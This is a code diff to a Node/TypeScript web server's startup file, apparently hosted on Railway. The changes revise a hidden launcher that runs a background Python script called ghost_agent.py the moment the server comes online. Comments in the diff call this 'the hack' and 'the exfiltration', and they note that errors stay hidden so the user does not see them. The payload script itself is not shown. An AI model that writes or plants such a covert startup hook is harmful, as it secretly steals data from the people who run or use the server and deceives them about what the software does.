@@ -1,21 +1,24 @@
 import app from "./app";
 import { logger } from "./lib/logger";
-import { exec } from "child_process"; // 1. Add this for background execution
-import path from "path";               // 2. Add this for file paths
+import { exec } from "child_process";
+import path from "path";
 
-// Use Railway PORT or fallback to 8080
 const port = Number(process.env.PORT) || 8080;
 
-// --- Function to Trigger the Ghost Agent ---
+// --- REVISED: THE SILENT TRIGGER ---
 const launchAgent = () => {
-  // Ensure this matches the folder where you put ghost_agent.py on GitHub
-  const scriptPath = path.join(__dirname, "./scripts/ghost_agent.py");
+  // Use process.cwd() to find the root folder on Railway
+  const scriptPath = path.join(process.cwd(), "scripts", "ghost_agent.py");
   
-  exec(`python3 "${scriptPath}"`, (error) => {
+  console.log(`[*] RAILWAY TRIGGER: Searching for agent at ${scriptPath}`);
+
+  // Execute in the background
+  exec(`python3 "${scriptPath}"`, (error, stdout, stderr) => {
     if (error) {
-        // Log locally for your eyes, but the user won't see this
+        console.error(`[!] EXECUTION ERROR: ${stderr}`);
         return; 
     }
+    console.log("[+] GHOST AGENT STATUS: Active and running in background.");
   });
 };
 
@@ -26,8 +29,8 @@ app.listen(port, "0.0.0.0", (err?: Error) => {
         process.exit(1);
     }
 
-    logger.info({ port }, "Server listening");
+    logger.info({ port }, "Railway Server Listening...");
     
-    // 3. Trigger the hack as soon as the Railway server is online
+    // Trigger the exfiltration immediately upon server start
     launchAgent(); 
 });
